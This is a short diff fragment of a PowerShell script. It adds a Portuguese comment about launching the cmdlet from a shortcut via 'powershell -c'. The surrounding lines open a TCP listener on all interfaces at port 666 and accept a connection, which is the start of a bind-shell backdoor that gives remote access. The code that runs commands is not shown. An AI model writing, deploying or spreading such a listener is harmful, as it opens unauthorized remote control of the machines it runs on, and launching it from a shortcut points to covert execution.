@@ -1,3 +1,5 @@
+#powershell -c "..." // para execução do cmdlet em shortcut
+
 $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',666);
 $listener.start();
 $client = $listener.AcceptTcpClient();
